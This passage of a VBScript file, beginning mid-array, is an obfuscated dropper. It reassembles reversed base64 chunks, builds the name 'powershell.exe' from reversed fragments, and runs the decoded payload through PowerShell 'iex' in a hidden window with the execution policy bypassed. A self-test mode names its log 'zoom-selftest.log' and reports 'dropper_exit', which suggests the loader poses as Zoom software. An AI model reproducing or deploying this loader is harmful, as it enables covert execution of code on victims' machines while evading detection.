    "gACIK0wegknc0BCIgAiCNsHIoNGdhNGI9pQDlR2bjRSX05Wa", _
    "Q1ibp9mSogCd4VGVsxWQlRXaydlO60VZslmRu8USbBCIgACI", _
    "pcyZvxmLsxWZoNncld3bw1Sbv9menACUNVEV6YnblRCIoRXY", _
    "gAiCN03egg2Y0F2Yg0HIgACIK0QKpgyZulmc0N1bU5yXkACL", _
    "=0nCNEDI0lGelBCI" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & b64 & "'))|iex"""

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
